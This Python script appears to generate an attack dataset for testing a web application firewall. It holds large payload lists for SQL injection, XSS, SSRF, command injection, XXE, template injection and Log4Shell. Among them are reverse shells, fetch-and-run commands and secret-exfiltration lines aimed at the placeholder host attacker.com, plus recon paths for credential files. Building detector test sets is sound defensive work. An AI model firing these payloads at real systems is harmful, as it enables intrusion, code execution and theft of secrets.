#!/usr/bin/env python3
"""
Aegis-Gate adversarial dataset generator (v4).

Generates ~200k attack test-cases across 19 detector classes, plus
~10k FP-prone clean baselines, by combining:
  - Per-class base payload corpora (50-150 patterns each)
  - 12 obfuscation primitives (URL encode, double encode, mixed
    case, comment injection, whitespace tricks, unicode escapes,
    base64 wraps, hex escapes, IFS-tab splits, etc.)
  - Realistic per-class target-path matrices
  - Header variation (User-Agent / Accept / X-Forwarded-For pools)
  - Method variation (GET/POST/PUT/DELETE) gated per class

Output (NDJSON, one JSON object per line):
  tests/security/dataset/attacks_v4.ndjson
  tests/security/dataset/clean_baselines_v4.ndjson

Run:
  python3 tests/security/dataset/generator/generate_v4.py
  python3 tests/security/dataset/generator/generate_v4.py --count 50000  (smaller)
  python3 tests/security/dataset/generator/generate_v4.py --seed 17

Determinism:
  Seeded PRNG (default 42). Re-running with the same seed and
  same script produces byte-identical output. Stable IDs derived
  from a hash of (class, payload, path, headers, body).
"""

from __future__ import annotations

import argparse
import base64
import hashlib
import itertools
import json
import os
import random
import string
import sys
import urllib.parse
from pathlib import Path
from typing import Callable, Iterable

# ---------------------------------------------------------------------------
# Path / method / header pools
# ---------------------------------------------------------------------------

USER_AGENTS_LEGIT = [
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14.1; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; SM-S921B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Mobile Safari/537.36",
    "curl/8.4.0",
    "Wget/1.21.4",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
    "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)",
    "Twitterbot/1.0",
    "okhttp/4.12.0",
    "python-requests/2.32.3",
    "Go-http-client/1.1",
]

USER_AGENTS_SCANNER = [
    "sqlmap/1.7.12#stable (https://sqlmap.org)",
    "nikto/2.5.0 (Evasions:0)",
    "Mozilla/5.00 (Nessus 10.6.0)",
    "Nmap Scripting Engine; https://nmap.org/book/nse.html",
    "Wfuzz/3.1.0",
    "ffuf/2.1.0",
    "gobuster/3.6",
    "dirb 2.22",
    "Nuclei - Open-source project (github.com/projectdiscovery/nuclei)",
    "Acunetix-Aspect/v6.20",
    "WPScan v3.8.25 (https://wpscan.com/wordpress-security-scanner)",
    "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)",
    "ZAP/2.14.0",
    "Burp/Professional 2024.10",
    "Wireshark/4.2.0",
    "masscan/1.3.2",
    "ZmEu",
    "Morfeus Fucking Scanner",
]

ACCEPT_HEADERS = [
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "application/json,text/plain,*/*",
    "*/*",
    "application/json",
    "text/html",
    "text/plain",
    "application/xml,text/xml,*/*;q=0.1",
]

XFF_IPS_PUBLIC = [
    "8.8.8.8", "1.1.1.1", "9.9.9.9", "208.67.222.222", "104.16.0.5",
    "151.101.1.69", "185.199.108.153", "13.107.21.200", "172.217.22.14",
    "157.240.22.35", "199.232.69.194", "23.45.34.18",
    "203.0.113.5", "198.51.100.10",  # TEST-NET reserved
    "94.102.61.7", "45.135.232.41", "91.234.99.99",  # eu/random
    "5.195.235.51", "185.220.101.5",  # tor / abused
    "223.5.5.5", "8.8.4.4", "104.21.14.6",
]

# Path matrices per attack class — realistic destinations the
# attacker would target.
PATHS_GENERIC_API = [
    "/api/users/123", "/api/users", "/api/orders/42", "/api/orders",
    "/api/products", "/api/products/100", "/api/login", "/api/auth",
    "/api/v1/items", "/api/v2/items", "/api/admin/config",
    "/api/internal/debug", "/api/transactions/show", "/api/search",
    "/api/profile", "/api/settings", "/api/notifications",
    "/api/cart", "/api/checkout", "/api/payments",
]

PATHS_GENERIC_WEB = [
    "/", "/search", "/login", "/signup", "/register", "/account",
    "/profile", "/settings", "/admin", "/dashboard", "/products",
    "/cart", "/checkout", "/orders", "/help", "/contact",
    "/feedback", "/support", "/news", "/blog", "/posts",
]

PATHS_FILES = [
    "/files", "/download", "/upload", "/static", "/uploads",
    "/files/index", "/files/download", "/files/view", "/files/get",
    "/assets/img", "/assets/js", "/media/uploads", "/docs",
]

PATHS_REDIRECT = [
    "/redirect", "/r", "/url", "/go", "/jump", "/out", "/link",
    "/redir", "/dest", "/return", "/next", "/callback", "/oauth/redirect",
]

PATHS_PROXY = [
    "/proxy", "/fetch", "/api/fetch", "/api/proxy", "/render",
    "/api/preview", "/preview", "/scrape", "/api/scrape",
    "/api/url", "/webhook", "/imageproxy",
]

PATHS_AUTH = [
    "/login", "/signin", "/sign-in", "/api/login", "/api/signin",
    "/auth", "/auth/login", "/api/auth", "/api/auth/login",
    "/api/v1/login", "/api/v2/login", "/account/login",
    "/user/login", "/users/login", "/session", "/sessions",
]

PATHS_RECON = [
    "/.env", "/.env.local", "/.env.backup", "/.env.production",
    "/.git/config", "/.git/HEAD", "/.git/index", "/.svn/entries",
    "/.aws/credentials", "/.ssh/id_rsa", "/.ssh/authorized_keys",
    "/.htaccess", "/.htpasswd", "/.bash_history", "/.npmrc",
    "/.dockerenv", "/.composer/auth.json", "/.npm/_authToken",
    "/web.config", "/server-status", "/server-info", "/phpinfo.php",
    "/info.php", "/test.php", "/admin.php", "/login.php",
    "/admin/login.php", "/admin/login", "/admin/index.php",
    "/wp-admin", "/wp-admin/", "/wp-admin/install.php",
    "/wp-login.php", "/wp-content/debug.log", "/wp-config.php",
    "/wp-config.php.bak", "/wp-content/uploads/", "/xmlrpc.php",
    "/phpmyadmin", "/phpmyadmin/", "/phpMyAdmin/", "/myadmin",
    "/adminer.php", "/admin/phpmyadmin", "/db/", "/database/",
    "/actuator", "/actuator/env", "/actuator/health", "/actuator/heapdump",
    "/actuator/configprops", "/actuator/threaddump", "/actuator/mappings",
    "/management/health", "/manage/health", "/health-check",
    "/console", "/console/login", "/h2-console", "/jmx-console",
    "/console.jsp", "/struts/utils.js", "/struts/webconsole.html",
    "/aws/credentials", "/api/v1/secrets", "/v1/secret/data/",
    "/api/keys", "/api/tokens", "/swagger.json", "/swagger-ui",
    "/api-docs", "/openapi.json", "/graphql/playground",
    "/.well-known/security.txt", "/.well-known/openid-configuration",
    "/robots.txt", "/sitemap.xml", "/crossdomain.xml",
    "/cgi-bin/test.cgi", "/cgi-bin/php-cgi", "/cgi-bin/php",
    "/jenkins/login", "/jenkins/manage", "/gitlab/admin",
    "/owa/auth/logon.aspx", "/exchange/", "/ECP/Current/exporttool/",
]

PATHS_GRAPHQL = ["/graphql", "/api/graphql", "/v1/graphql", "/query"]

PATHS_HEADER_TARGET = [
    "/", "/login", "/api/search", "/profile", "/admin",
    "/api/v1/users", "/dashboard",
]

# ---------------------------------------------------------------------------
# Per-class base payload corpora
# ---------------------------------------------------------------------------

PAYLOADS_SQLI = [
    # Boolean / classic
    "' OR 1=1--", "' OR '1'='1", "admin'--", "admin' #", "1' OR '1'='1'--",
    "1' OR 1=1#", "' OR 1=1 LIMIT 1--", "1') OR ('1'='1", "'OR 1=1/*",
    "' || 1=1--", "x' OR username LIKE '%admin%'--", "1' AND 1=1--",
    "1' AND 1=2--", "1' AND ASCII(SUBSTRING(database(),1,1))=109--",
    # UNION-based
    "1 UNION SELECT NULL,NULL,NULL--", "1 UNION SELECT username,password,NULL FROM users--",
    "1 UNION SELECT @@version,user(),database()--", "0 UNION SELECT 1,table_name,3 FROM information_schema.tables--",
    "-1 UNION SELECT 1,2,3,4,5,6--", "-1 UNION ALL SELECT NULL,NULL,version()--",
    "' UNION SELECT @@version,@@hostname,@@datadir,NULL--",
    "' UNION SELECT 1,group_concat(table_name),3,4 FROM information_schema.tables--",
    "1 UNION SELECT load_file('/etc/passwd'),NULL,NULL--",
    # Time-based blind
    "1; SELECT SLEEP(5)--", "1' AND SLEEP(5)--", "1' OR SLEEP(5)--",
    "1; WAITFOR DELAY '0:0:5'--", "1' WAITFOR DELAY '0:0:5'--",
    "1 OR pg_sleep(5)--", "1; SELECT pg_sleep(5)--", "1' AND BENCHMARK(5000000,SHA1(1))--",
    "1 AND IF(MID(version(),1,1)='5',sleep(3),0)",
    # Stacked
    "1; DROP TABLE users--", "1'; DROP TABLE users; --", "1; EXEC xp_cmdshell('whoami')--",
    "1; INSERT INTO admin VALUES('h','x')--", "1; UPDATE users SET role='admin' WHERE id=1--",
    "1; CREATE TABLE pwn (a INT); --",
    # Out-of-band / OOB
    "1' AND (SELECT LOAD_FILE(CONCAT('\\\\\\\\',(SELECT password FROM users LIMIT 1),'.attacker.com\\\\a')))--",
    "1 UNION SELECT * FROM OPENROWSET('SQLOLEDB','attacker.com';'sa';'pwd','select 1')--",
    "1' AND extractvalue(1,concat(0x7e,(SELECT version())))--",
    "1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
    # Second-order / polyglot
    "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"`/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
    "SLEEP(0)/*'XOR(SLEEP(0))OR'|\"XOR(SLEEP(0))OR\"*/",
    "1';SELECT IF(1=1,SLEEP(3),0)#",
    # Encoding-only base (mutators will further obfuscate)
    "/**/UNION/**/SELECT/**/null,version(),null--",
    "U%4eION SELECT NULL--",
    "U%2bNION SELECT NULL--",
    "/*!50000UNION*/ /*!50000SELECT*/ user,password FROM mysql.user--",
    # MS SQL
    "1; EXEC master..xp_cmdshell 'dir c:\\'--",
    "1; EXEC sp_oacreate 'wscript.shell'--",
    "1' AND 1=CONVERT(int,(SELECT @@version))--",
    # PostgreSQL
    "1; COPY (SELECT '') TO PROGRAM 'whoami'--",
    "1 UNION SELECT NULL,current_database(),current_user--",
    "1; CREATE LANGUAGE plpython3u; CREATE FUNCTION pwn() RETURNS text AS $$import os; return os.popen('id').read()$$ LANGUAGE plpython3u; SELECT pwn();--",
    # Oracle
    "1' UNION SELECT NULL FROM dual WHERE 1=UTL_INADDR.get_host_address('attacker.com')--",
    "1' AND DBMS_PIPE.RECEIVE_MESSAGE(('a'),10)='a",
]

PAYLOADS_XSS = [
    "<script>alert(1)</script>", "<script>alert('XSS')</script>",
    "<script>alert(document.cookie)</script>", "<script src='//evil.com/x.js'></script>",
    "<svg onload=alert(1)>", "<svg/onload=alert(1)>", "<svg><script>alert(1)</script></svg>",
    "<img src=x onerror=alert(1)>", "<img src='x' onerror='alert(1)'>",
    "<body onload=alert(1)>", "<iframe src=javascript:alert(1)>",
    "<a href=javascript:alert(1)>x</a>", "<details open ontoggle=alert(1)>",
    "<input autofocus onfocus=alert(1)>", "<select autofocus onfocus=alert(1)>",
    "<textarea autofocus onfocus=alert(1)></textarea>",
    "<keygen autofocus onfocus=alert(1)>", "<video><source onerror=alert(1)>",
    "<audio src=x onerror=alert(1)>", "<marquee onstart=alert(1)>x</marquee>",
    # Event handlers
    "\" onmouseover=\"alert(1)", "' onmouseover='alert(1)",
    "\"><script>alert(1)</script>", "'><script>alert(1)</script>",
    "\" autofocus onfocus=alert(1) x=\"", "javascript:alert(1)",
    "javascript:alert(document.domain)", "data:text/html,<script>alert(1)</script>",
    "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
    # Encoded variants
    "&#60;script&#62;alert(1)&#60;/script&#62;",
    "%3Cscript%3Ealert(1)%3C/script%3E",
    "&lt;script&gt;alert(1)&lt;/script&gt;",
    # Polyglots
    "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
    "\"-prompt(1)-\"", "</title><script>alert(1)</script>",
    # mXSS / SVG / MathML
    "<math><mtext><table><mglyph><style><img title='</style><img src=x onerror=alert(1)>'>",
    "<svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>click</text></a>",
    "<svg><script>alert&#40;1&#41;</script>",
    # DOM-based fragments
    "#<script>alert(1)</script>", "#javascript:alert(1)",
    # CSS-based
    "<style>@import 'javascript:alert(1)'</style>",
    "<link rel=stylesheet href=javascript:alert(1)>",
    # Filter-bypass
    "<sc<script>ript>alert(1)</sc</script>ript>",
    "<SCRIPT >alert(1)</SCRIPT >",
    "<sCrIpT>alert(1)</ScRiPt>",
    "<scr\x00ipt>alert(1)</scr\x00ipt>",
    "<script\x20type=text/javascript>alert(1)</script>",
    # Modern framework abuse
    "{{constructor.constructor('alert(1)')()}}",
    "${alert(1)}",
    "<%= alert(1) %>",
]

PAYLOADS_PATH_TRAVERSAL = [
    "../../../etc/passwd", "../../../../etc/passwd", "../../../../../etc/passwd",
    "../../../../../../etc/passwd", "../../../../../../../etc/passwd",
    "../../../../../../../../etc/passwd", "../../../../../../../../../../etc/passwd",
    "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
    "..\\..\\..\\..\\windows\\win.ini",
    "..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\system32\\config\\sam",
    "/etc/passwd", "/etc/shadow", "/etc/hosts", "/etc/issue",
    "/proc/self/environ", "/proc/self/cmdline", "/proc/version",
    "/proc/cpuinfo", "/proc/net/arp", "/proc/net/tcp",
    "/var/log/auth.log", "/var/log/apache2/access.log",
    "/root/.ssh/id_rsa", "/home/admin/.bash_history",
    "C:\\windows\\system32\\drivers\\etc\\hosts",
    "C:\\boot.ini", "C:\\windows\\win.ini",
    "file:///etc/passwd", "file:///c:/windows/win.ini",
    # URL-encoded
    "..%2F..%2F..%2Fetc%2Fpasswd",
    "..%2f..%2f..%2fetc%2fpasswd",
    "..%252F..%252F..%252Fetc%252Fpasswd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "%2e%2e/%2e%2e/%2e%2e/etc/passwd",
    # Null-byte
    "../../../etc/passwd%00", "../../../etc/passwd%00.jpg",
    # Overlong UTF-8
    "..%c0%af..%c0%afetc%c0%afpasswd",
    "..%c1%9c..%c1%9cetc%c1%9cpasswd",
    # 16-bit unicode
    "..%u002f..%u002fetc%u002fpasswd",
    # Mixed slashes
    "..\\../..\\../etc/passwd",
    "..//..//..//etc/passwd",
    "...//...//...//etc/passwd",
    # UNC paths (Windows)
    "\\\\attacker.com\\share\\file.txt",
    "\\\\?\\C:\\windows\\system32\\drivers\\etc\\hosts",
]

PAYLOADS_SSRF = [
    "http://127.0.0.1", "http://127.0.0.1:22", "http://127.0.0.1:80",
    "http://127.0.0.1:8080", "http://127.0.0.1:6379",  # redis
    "http://127.0.0.1:5432",  # postgres
    "http://127.0.0.1:3306",  # mysql
    "http://localhost", "http://localhost:8080", "http://localhost/admin",
    "http://0.0.0.0", "http://0", "http://2130706433",  # decimal 127.0.0.1
    "http://0x7f.0x0.0x0.0x1", "http://0x7f000001", "http://017700000001",  # octal
    "http://[::1]", "http://[::ffff:127.0.0.1]", "http://[0:0:0:0:0:0:0:1]",
    "http://0.0.0.0.nip.io", "http://localtest.me", "http://127.0.0.1.xip.io",
    # IMDS - AWS / GCP / Azure
    "http://169.254.169.254/", "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://169.254.169.254/computeMetadata/v1/", "http://metadata.google.internal/",
    "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    "http://[fd00:ec2::254]/latest/meta-data/",  # IPv6 IMDS
    # Cloud-specific
    "http://100.100.100.200/latest/meta-data/",  # alibaba
    "http://192.0.0.192/openstack/latest/meta_data.json",
    # Non-HTTP schemes
    "file:///etc/passwd", "file:///c:/windows/win.ini",
    "gopher://127.0.0.1:6379/_FLUSHALL",
    "gopher://127.0.0.1:11211/_stats",
    "dict://127.0.0.1:11211/stats", "ldap://127.0.0.1:389/",
    "ftp://anonymous@127.0.0.1/", "tftp://127.0.0.1/file",
    "sftp://127.0.0.1/", "telnet://127.0.0.1:23/",
    "jar:http://attacker.com!/", "ssh://127.0.0.1:22/",
    "smb://127.0.0.1/share", "smbs://127.0.0.1/share",
    # DNS rebinding hosts (well-known)
    "http://7f000001.attacker.com", "http://localhost.attacker.com",
    "http://make-me-localhost.attacker.com",
    # Bypass tricks
    "http://attacker.com#@127.0.0.1/", "http://attacker.com@127.0.0.1/",
    "http://attacker.com\\@127.0.0.1/", "http://127.0.0.1\\@attacker.com/",
    "http:127.0.0.1", "http:/\\/127.0.0.1",
    # Common SSRF endpoints
    "http://127.0.0.1:8500/v1/agent/services",  # consul
    "http://127.0.0.1:2375/containers/json",  # docker
    "http://127.0.0.1:10250/pods",  # kubelet
    "http://127.0.0.1:9090/api/v1/query?query=up",  # prom
    "http://127.0.0.1:5601/api/console/proxy",  # kibana
]

PAYLOADS_CMD_INJECTION = [
    "; id", "&& id", "| id", "|| id", "; whoami", "&& whoami", "|whoami",
    "; cat /etc/passwd", "&& cat /etc/passwd", "|cat /etc/passwd",
    "; ls -la", "; uname -a", "; pwd", "; env",
    "`id`", "`whoami`", "$(id)", "$(whoami)", "$(cat /etc/passwd)",
    "${IFS}id", "${IFS}whoami", "x;{cat,/etc/passwd}",
    "x; cat${IFS}/etc/passwd", "x;${IFS}cat${IFS}/etc/passwd",
    "; sleep 5", "&& sleep 5", "|sleep 5", "`sleep 5`", "$(sleep 5)",
    "; ping -c 5 127.0.0.1", "&& nc -e /bin/sh attacker.com 4444",
    "; nslookup attacker.com", "; curl http://attacker.com/$(id|base64)",
    "; wget http://attacker.com/x.sh -O - | sh",
    # Windows
    "; dir", "& dir", "&& dir c:\\", "&systeminfo", "|systeminfo",
    "& whoami /priv", "& net user admin pwn123 /add",
    "& powershell -nop -c IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/x.ps1')",
    # PHP-specific
    "${@phpinfo()}", "<?php system('id'); ?>", "${@`id`}",
    # Reverse shells / out-of-band
    "; bash -i >& /dev/tcp/attacker.com/4444 0>&1",
    "; python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"attacker.com\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
    "; perl -e 'use Socket;...'",
    # Encoding bypass
    "$'\\x69\\x64'", "\\$\\(id\\)", "%0acat%20/etc/passwd",
    "%0aid", "%0a%20id%20",
    # Cobalt-Strike / log4shell-style
    "${jndi:ldap://attacker.com/a}",
    # Java Runtime
    "Runtime.getRuntime().exec(\"id\")",
    # Unicode-escaped
    "\\u003B id", "%E2%80%A8id",  # line separator
]

PAYLOADS_HEADER_INJECTION = [
    # CRLF — header / response splitting
    "test\r\nX-Injected: yes",
    "test%0d%0aX-Injected:%20yes",
    "test%0d%0aSet-Cookie:%20admin=true",
    "test\r\nLocation: http://evil.com",
    "test\r\n\r\n<script>alert(1)</script>",
    "test%0a%0d%0a<script>alert(1)</script>",
    "test%E5%98%8A%E5%98%8DSet-Cookie:%20evil=1",  # unicode CRLF
    # Host header tricks
    "Host: evil.com",
    "Host: localhost\r\nX-Forwarded-Host: evil.com",
    "evil.com#@victim.com",
    # X-Forwarded-For abuse
    "127.0.0.1, attacker.com",
    "127.0.0.1; whoami",
    "{{7*7}}",  # ssti in header value
    # Cache poisoning
    "X-Forwarded-Host: evil.com",
    "X-Original-URL: /admin",
    "X-Rewrite-URL: /admin",
    "Forwarded: for=127.0.0.1;host=evil.com",
    # Smuggling-adjacent
    "Transfer-Encoding: chunked\r\nTransfer-Encoding: identity",
    "Content-Length: 5\r\nTransfer-Encoding: chunked",
]

PAYLOADS_XXE = [
    "<?xml version=\"1.0\"?><!DOCTYPE x [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><x>&xxe;</x>",
    "<?xml version=\"1.0\"?><!DOCTYPE x [<!ENTITY % xxe SYSTEM \"http://attacker.com/xxe.dtd\">%xxe;]><x/>",
    "<?xml version=\"1.0\"?><!DOCTYPE x [<!ENTITY xxe SYSTEM \"file:///c:/windows/win.ini\">]><x>&xxe;</x>",
    "<?xml version=\"1.0\"?><!DOCTYPE x [<!ENTITY % file SYSTEM \"file:///etc/passwd\"><!ENTITY % oob \"<!ENTITY &#37; exfil SYSTEM 'http://attacker.com/?d=%file;'>\">%oob;%exfil;]><x/>",
    "<?xml version=\"1.0\"?><!DOCTYPE x SYSTEM \"http://attacker.com/evil.dtd\"><x/>",
    "<?xml version=\"1.0\" encoding=\"UTF-16\"?><!DOCTYPE x [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><x>&xxe;</x>",
    "<?xml version=\"1.0\"?><!DOCTYPE x [<!ENTITY xxe SYSTEM \"expect://id\">]><x>&xxe;</x>",
    "<?xml version=\"1.0\"?><!DOCTYPE x [<!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd\">]><x>&xxe;</x>",
    "<?xml version=\"1.0\"?><!DOCTYPE x [<!ENTITY % remote SYSTEM \"jar:http://attacker.com/evil.jar!/payload.dtd\">%remote;]><x/>",
    "<svg xmlns=\"http://www.w3.org/2000/svg\"><image href=\"file:///etc/passwd\"/></svg>",
]

PAYLOADS_SSTI = [
    # Jinja2 / Twig (Python / PHP)
    "{{7*7}}", "{{7*'7'}}", "{{config}}", "{{config.items()}}",
    "{{''.__class__.__mro__}}",
    "{{''.__class__.__mro__[1].__subclasses__()}}",
    "{{ ''.__class__.__bases__[0].__subclasses__()[396]('id', shell=True, stdout=-1).communicate() }}",
    "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
    "{{ namespace.__init__.__globals__.os.popen('id').read() }}",
    # Twig (PHP)
    "{{ _self.env.registerUndefinedFilterCallback('exec') }}{{ _self.env.getFilter('id') }}",
    "{{ ['id']|filter('system') }}",
    # ERB / Ruby
    "<%= 7*7 %>", "<%= system('id') %>", "<%= `id` %>",
    "<%= Process.pid %>", "<%= File.open('/etc/passwd').read %>",
    # Velocity (Java)
    "#set($x='') #set($r=$x.class.forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec('id'))",
    "$class.inspect('java.lang.Runtime').type.getRuntime().exec('id')",
    # Freemarker (Java)
    "<#assign x=\"freemarker.template.utility.Execute\"?new()>${x(\"id\")}",
    "${Runtime.getRuntime().exec(\"id\")}",
    "${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/etc/passwd').toURL().openStream()}",
    # Spring SpEL (Java)
    "${T(java.lang.Runtime).getRuntime().exec('id')}",
    "${new ProcessBuilder({'id'}).start()}",
    "#{T(java.lang.Runtime).getRuntime().exec('id')}",
    # Handlebars / JS
    "{{#with 'constructor.constructor' as |c|}}{{c.constructor('alert(1)')()}}{{/with}}",
    "{{#with (lookup this 'constructor')}}{{#with (lookup this 'constructor')}}{{this 'alert(1)'}}{{/with}}{{/with}}",
    # Mako (Python)
    "${self.module.cache.util.os.popen('id').read()}",
    "<% import os; x=os.popen('id').read() %>${x}",
    # Pebble (Java)
    "{{ 'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('js').eval('1+1') }}",
    # Pug (Node)
    "#{root.process.mainModule.require('child_process').execSync('id')}",
]

PAYLOADS_LDAP = [
    "*", "*)(&", "*))(|(uid=*", "*)(uid=*))(|(uid=*",
    "admin)(&)", "admin)((|", "*)(objectClass=*",
    "*)(cn=*", "*)(mail=*", "*)(|(sn=*", "*)(givenName=*",
    "x)(uid=*))(|(uid=*", "*)(|(password=*))",
    "*)((cn=*))(|", "*\\00", "*\\2A", "*)|(|(uid=*)",
    "*))(|(objectClass=*", "*))%00", "*; #",
]

PAYLOADS_NOSQL = [
    # MongoDB
    "{\"$ne\":null}", "{\"$gt\":\"\"}", "{\"$gt\":-1}",
    "{\"$where\":\"this.username==this.password\"}",
    "{\"$where\":\"sleep(5000)\"}",
    "{\"$where\":\"function(){return true}\"}",
    "{\"$regex\":\".*\"}", "{\"$regex\":\"^a\"}",
    "{\"username\":{\"$ne\":null},\"password\":{\"$ne\":null}}",
    "{\"username\":{\"$regex\":\".*\"},\"password\":{\"$regex\":\".*\"}}",
    "{\"$gt\":{\"$date\":0}}",
    # MongoDB operator injection in query string (no JSON)
    "username[$ne]=null&password[$ne]=null",
    "username[$gt]=&password[$gt]=",
    "username[$regex]=.*&password[$regex]=.*",
    "u[$where]=this.username==this.password",
    "u[$where]=sleep(5000)",
    # JS NoSQL
    "';return(true);var x='",
    "';return%201%3d%3d%201;//",
    "1;return%20true%3B'",
]

PAYLOADS_LOG4SHELL = [
    "${jndi:ldap://attacker.com/a}",
    "${jndi:ldaps://attacker.com/a}",
    "${jndi:rmi://attacker.com/a}",
    "${jndi:dns://attacker.com/a}",
    "${jndi:iiop://attacker.com/a}",
    # Obfuscated
    "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attacker.com/a}",
    "${${lower:j}${lower:n}${lower:d}${lower:i}:${lower:l}${lower:d}${lower:a}${lower:p}://attacker.com/a}",
    "${${::-j}ndi:ldap://attacker.com/a}",
    "${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//attacker.com/a}",
    "${jndi:${lower:l}${lower:d}ap://attacker.com/a}",
    "${jndi:dns://${sys:user.name}.attacker.com/a}",
    "${jndi:ldap://${env:AWS_SECRET_ACCESS_KEY}.attacker.com/a}",
    "${jndi:ldap://${hostName}.attacker.com/a}",
    # Layered obfuscation
    "${${env:BARFOO:-j}ndi:${env:BARFOO:-l}dap://attacker.com/x}",
    "${${k8s:k5:-${upper:j}}ndi:${${k8s:k5:-${upper:l}}}dap://attacker.com/a}",
]

PAYLOADS_OPEN_REDIRECT = [
    "//evil.com", "//evil.com/login",
    "https://evil.com", "https://evil.com/account",
    "//google.com.evil.com", "/\\evil.com",
    "/\\\\evil.com", "%2F%2Fevil.com", "%2f%2fevil.com",
    "http:evil.com", "https:evil.com",
    "//evil.com/?x=victim.com",
    "javascript:alert(1)", "data:text/html,<script>alert(1)</script>",
    "https://victim.com@evil.com",
    "https://victim.com.evil.com",
    "/redirect?to=//evil.com",
    "/login?next=//evil.com",
    "/r?u=https://evil.com",
    "//evil.com#@victim.com",
    "https://%65vil.com",
]

PAYLOADS_HTTP_SMUGGLING = [
    # These are body-level constructs — the WAF should reject the
    # whole request when it sees the Transfer-Encoding / Content-
    # Length conflict.
    "0\r\n\r\nGET /admin HTTP/1.1\r\nHost: localhost\r\n\r\n",
    "1\r\nA\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nHost: localhost\r\n\r\n",
    "POST /search HTTP/1.1\r\nHost: localhost\r\nTransfer-Encoding: chunked\r\nContent-Length: 6\r\n\r\n0\r\n\r\nG",
]

PAYLOADS_RECON_FILE = [p for p in PATHS_RECON]

PAYLOADS_GRAPHQL = [
    "{__schema{types{name,fields{name}}}}",  # introspection
    "{__schema{queryType{name},mutationType{name},subscriptionType{name}}}",
    "{__type(name:\"User\"){fields{name,type{name,kind}}}}",
    "query{user(id:1){posts{comments{author{posts{comments{author{name}}}}}}}}",  # deep nesting
    "query{user(id:\"1 OR 1=1\"){name}}",
    "mutation{login(email:\"' OR '1'='1\",password:\"x\"){token}}",
    "mutation{deleteAllUsers}",
    "query{__schema{directives{name,locations}}}",
    "{users(first:100000){id,name}}",  # resource exhaustion
]

PAYLOADS_RCE_DESERIALIZATION = [
    # Java ysoserial-style base64 markers
    "rO0ABXNyABRqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUw=",  # Java
    "rO0ABXNyADFzdW4ucmVmbGVjdC5hbm5vdGF0aW9uLkFubm90YXRpb25JbnZvY2F0aW9uSGFuZGxlcg==",
    "rO0ABXNyABNqYXZhLnV0aWwuQXJyYXlMaXN0eIHSHZnHYZ0",
    # PHP unserialize
    "O:8:\"stdClass\":1:{s:4:\"name\";s:5:\"admin\";}",
    "a:2:{i:0;s:8:\"username\";i:1;s:8:\"password\";}",
    "O:14:\"PendingFlush_2\":1:{s:8:\"workpath\";s:6:\"/tmp/x\";}",
    # Python pickle (base64-encoded "system('id')")
    "gASVKAAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAJpZJSFlFKULg==",
    # Ruby Marshal
    "BAhJIgJqYXZheC5tYW5hZ2VtZW50LkJhc2hzdG9ybmcGOgZFRg==",
    # .NET BinaryFormatter
    "AAEAAAD/////AQAAAAAAAAAEAQAAACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVy",
]

PAYLOADS_PROTOTYPE_POLLUTION = [
    "{\"__proto__\":{\"polluted\":true}}",
    "{\"constructor\":{\"prototype\":{\"polluted\":true}}}",
    "__proto__[admin]=true",
    "__proto__.admin=true",
    "constructor[prototype][admin]=true",
    "constructor.prototype.admin=true",
    "{\"__proto__\":{\"isAdmin\":true,\"role\":\"admin\"}}",
    "?__proto__[isAdmin]=true",
